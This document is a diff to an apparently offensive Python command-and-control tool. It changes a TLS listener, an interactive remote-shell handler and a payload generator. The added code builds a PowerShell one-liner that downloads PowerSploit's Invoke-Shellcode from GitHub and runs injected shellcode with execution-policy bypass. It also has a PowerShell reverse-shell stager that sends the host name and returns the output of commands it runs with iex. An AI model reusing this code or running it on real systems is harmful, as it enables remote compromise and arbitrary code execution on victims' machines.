@@ -59,14 +59,14 @@ def startClientListener():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="AES256", certfile="server.crt", keyfile="server.key", server_side=True)
     except:
-        sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Rerun ./setup.py to generate certs" + t.normal + '\n> ')
+        sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Rerun ./setup.py to generate certs" + t.normal)
         sys.stdout.flush()
         sys.exit(1)
     try:
         ws.bind((FUNCTIONS().CheckInternet(), 5555))
         ws.listen(30)
     except:
-        sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Port in use" + t.normal + '\n> ')
+        sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Port in use" + t.normal)
         sys.stdout.flush()
         sys.exit(1)
 
@@ -80,7 +80,7 @@ def startClientListener():
 
         if clientconn:
             clientnumber += 1
-            sys.stdout.write('\r' + t.bold_green + "connection from %s %s"%(ip,port) + t.normal + '\n> ')
+            sys.stdout.write('\r' + t.bold_green + "connection from %s %s"%(ip,port) + t.normal)
             sys.stdout.flush()
 
             worker = Thread(target=pingClients, args=(clientconn,clientnumber))
@@ -94,17 +94,20 @@ def startClientListener():
 
 
 def interactShell(clientconn,clientnumber):
+    computerName = ""
     from menu import clientMenuOptions
     print "Commands\n" + "-"*24 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*24
-
     while True:
-        if clientconn in select.select([clientconn], [], [], 0.2)[0]:
-            clientconn.recv(1024)
-        command = raw_input("PS > ")
+        while clientconn in select.select([clientconn], [], [], 0.3)[0]:
+            computerName += clientconn.recv(2048)
+            if len(computerName) > 1:
+                print t.bold_yellow + computerName + t.normal
+
+        command = raw_input("> ")
         if command == "back":
             break
-        elif command == "" or command == "\n":
-            continue
+        elif command == "":
+            clientconn.sendall("\n")
         elif command == "exit":
             if str(clientnumber) in clientMenuOptions.keys():
                 print t.bold_red + "Client Connection Killed" + t.normal
@@ -130,7 +133,7 @@ def clientUpload(fileToUpload,clientconn,powershellExec,isExe):
             newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
             encPowershell = "IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/CodeExecution/Invoke-Shellcode.ps1');Start-Sleep 20;Invoke-Shellcode -Force -Shellcode @(%s)"%newpayloadlayout.rstrip(',')
             encPowershell = base64.b64encode(encPowershell.encode('utf_16_le'))
-            powershellExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if ($Arch -eq 'x86') {powershell -exec bypass -enc \"%s\"}elseif ($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
+            powershellExec = "try{$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if ($Arch -eq 'x86') {powershell -exec bypass -enc \"%s\"}elseif ($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}}catch{pass}"%(encPowershell,encPowershell)
 
         clientconn.sendall(powershellExec)
 
@@ -141,13 +144,15 @@ def printListener():
         "$b = New-Object Byte[] $c.ReceiveBufferSize;"
         "$sl = New-Object System.Net.Security.SslStream $c.GetStream(),$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
         "$sl.AuthenticateAsClient($env:computername);"
+        "$h = ($env:computername);$he = ([text.encoding]::ASCII).GetBytes($h);$sl.Write($he,0,$he.Length);"
         "while(1){"
         "try{$i = $sl.Read($b, 0, $b.Length)}catch{exit};"
         "if ($i -lt 1){exit};"
         "$sb = New-Object -TypeName System.Text.ASCIIEncoding; $d = $sb.GetString($b,0, $i).replace(\"`0\",\"\");"
         "if ($d.Length -gt 0){$cb = (iex -c $d 2>&1 | Out-String);"
-        "$br = $cb + ($error[0] | Out-String) + \"`0\";$error.clear();"
-        "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);$sl.Flush()}}")
+        "$br = $cb + ($error[0] | Out-String) + ($pwd.path) + \"`0\";$error.clear();"
+        "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);"
+        "$sl.Flush()}}")
 
     powershellFileName = 'p.ps1'
     with open((payloaddir()+ '/' + powershellFileName), 'w') as powershellStagerFile:
